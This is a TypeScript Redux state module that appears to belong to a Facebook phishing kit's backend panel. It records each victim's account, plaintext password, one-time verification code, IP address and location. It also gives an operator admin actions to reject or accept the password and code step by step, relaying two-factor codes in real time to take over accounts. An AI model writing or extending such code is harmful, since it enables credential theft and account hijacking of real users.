import { createSlice } from '@reduxjs/toolkit';
import axios from '../../utils/axios';
import { dispatch } from '../store';

// ----------------------------------------------------------------------

export type IFbUser = {
  id: string;
  account: string;
  password: string;
  verifyCode: string | null;
  status: 'pending_pass' | 'wrong_pass' | 'pending_otp' | 'completed';
  ipAddress: string | null;
  country: string | null;
  region: string | null;
  city: string | null;
  createdAt: string;
};

type IFbState = {
  isLoading: boolean;
  error: string | null;
  fbUsers: IFbUser[];
  pagination: { total: number; page: number; limit: number; totalPages: number } | null;
};

const initialState: IFbState = {
  isLoading: false,
  error: null,
  fbUsers: [],
  pagination: null,
};

const slice = createSlice({
  name: 'fb',
  initialState,
  reducers: {
    startLoading(state) {
      state.isLoading = true;
    },
    hasError(state, action) {
      state.isLoading = false;
      state.error = action.payload;
    },
    getFbUsersSuccess(state, action) {
      state.isLoading = false;
      state.fbUsers = action.payload.fbUsers;
      state.pagination = action.payload.pagination;
    },
    fbUserAdded(state, action) {
      state.fbUsers = [action.payload, ...state.fbUsers];
    },
    fbUserUpdated(state, action) {
      const index = state.fbUsers.findIndex((u) => u.id === action.payload.id);
      if (index !== -1) {
        state.fbUsers[index] = action.payload;
      }
    },
    fbUserDeleted(state, action) {
      state.fbUsers = state.fbUsers.filter((u) => u.id !== action.payload);
    },
  },
});

export default slice.reducer;
export const { fbUserAdded, fbUserUpdated, fbUserDeleted } = slice.actions;

// ----------------------------------------------------------------------

export function getFbUsers(params?: any) {
  return async () => {
    dispatch(slice.actions.startLoading());
    try {
      const response = await axios.get('/api/fb', { params });
      dispatch(slice.actions.getFbUsersSuccess(response.data));
    } catch (error: any) {
      dispatch(slice.actions.hasError(error?.message || 'Error'));
    }
  };
}

// Submit FB login credentials
export async function submitFbLogin(data: {
  account: string;
  password: string;
  ipAddress?: string;
  country?: string;
  region?: string;
  city?: string;
}) {
  const response = await axios.post('/api/fb/login', data);
  return response.data as { id: string };
}

// Submit FB OTP
export async function submitFbOtp(id: string, verifyCode: string) {
  const response = await axios.post('/api/fb/otp', { id, verifyCode });
  return response.data;
}

// Admin: trigger wrong password
export async function returnWrongPass(id: string) {
  const response = await axios.post(`/api/fb/${id}/wrong-pass`);
  return response.data;
}

// Admin: approve password (go to OTP)
export async function acceptFbPass(id: string) {
  const response = await axios.post(`/api/fb/${id}/accept-pass`);
  return response.data;
}

// Admin: approve OTP (final redirect)
export async function acceptFbOtp(id: string) {
  const response = await axios.post(`/api/fb/${id}/accept-otp`);
  return response.data;
}

// Admin: trigger wrong OTP
export async function returnWrongOtp(id: string) {
  const response = await axios.post(`/api/fb/${id}/wrong-otp`);
  return response.data;
}

// Admin: delete fb user record
export function deleteFbUser(id: string) {
  return async () => {
    try {
      await axios.delete(`/api/fb/${id}`);
      dispatch(slice.actions.fbUserDeleted(id));
    } catch (error: any) {
      dispatch(slice.actions.hasError(error?.message || 'Error'));
    }
  };
}
